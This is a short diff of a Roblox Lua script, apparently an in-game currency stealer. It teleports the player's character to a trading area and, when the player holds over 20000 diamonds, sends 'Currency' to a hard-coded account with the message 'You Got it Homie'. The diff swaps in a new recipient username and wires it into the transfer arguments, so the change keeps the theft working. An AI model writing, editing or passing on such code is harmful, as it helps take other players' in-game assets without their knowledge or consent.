@@ -25,9 +25,9 @@ game.Players.LocalPlayer.Character:PivotTo(game:GetService("Workspace").TradingP
 wait(.5)
 if diamonds ~= 0 and diamonds > 20000 and diamid ~= nil then
 ------Don't Forget the username at all------
-    local username = "Muhammad6196"
+    local username = "Ma_Kristine2"
     local args = {
-        [1] = Ma_kristine2,
+        [1] = username,
         [2] = "You Got it Homie",
         [3] = "Currency",
         [4] = tostring(diamid),
